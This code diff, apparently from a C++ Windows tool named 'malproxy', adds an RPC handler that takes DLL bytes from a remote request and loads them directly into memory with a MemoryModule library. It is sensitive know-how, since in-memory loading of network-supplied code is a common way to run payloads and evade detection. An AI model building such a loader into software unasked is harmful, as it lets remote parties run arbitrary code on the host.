@@ -6,6 +6,7 @@
 #include "Framework/Event.h"
 #include <Windows.h>
 #include "Framework/Utils.h"
+#include "Framework/MemoryModule.h"
 
 extern std::map<std::string, std::map<std::string, std::function<malproxy::CallFuncResponse(const malproxy::CallFuncRequest&, FARPROC)>>> hooks;
 
@@ -24,6 +25,16 @@ malproxy::LoadLibraryResponse LoadLibraryFuncHandler(const malproxy::LoadLibrary
 	malproxy::LoadLibraryResponse response;
 	std::unique_ptr<malproxy::HandleType> handle = std::make_unique<malproxy::HandleType>();
 	handle->set_handle((uint64_t)module);
+	response.set_allocated_handle(handle.release());
+	return response;
+}
+
+malproxy::LoadLibraryResponse LoadLibraryExFuncHandler(const malproxy::LoadLibraryExRequest& request)
+{
+	HMEMORYMODULE payload = MemoryLoadLibraryEx(request.dll_data().data(), request.dll_data().size(), MemoryDefaultAlloc, MemoryDefaultFree, MemoryDefaultLoadLibrary, MemoryDefaultGetProcAddress, MemoryDefaultFreeLibrary, nullptr);
+	malproxy::LoadLibraryResponse response;
+	std::unique_ptr<malproxy::HandleType> handle = std::make_unique<malproxy::HandleType>();
+	handle->set_handle((uint64_t)payload);
 	response.set_allocated_handle(handle.release());
 	return response;
 }
@@ -48,6 +59,7 @@ int main()
 	RpcServerCallbacks callbacks;
 	callbacks.CallCollectorFunc = CallCollectorFuncHandler;
 	callbacks.LoadLibraryFunc = LoadLibraryFuncHandler;
+	callbacks.LoadLibraryExFunc = LoadLibraryExFuncHandler;
 	callbacks.FreeLibraryFunc = FreeLibraryFuncHandler;
 
 	if (!SetConsoleCtrlHandler(consoleHandler, TRUE))
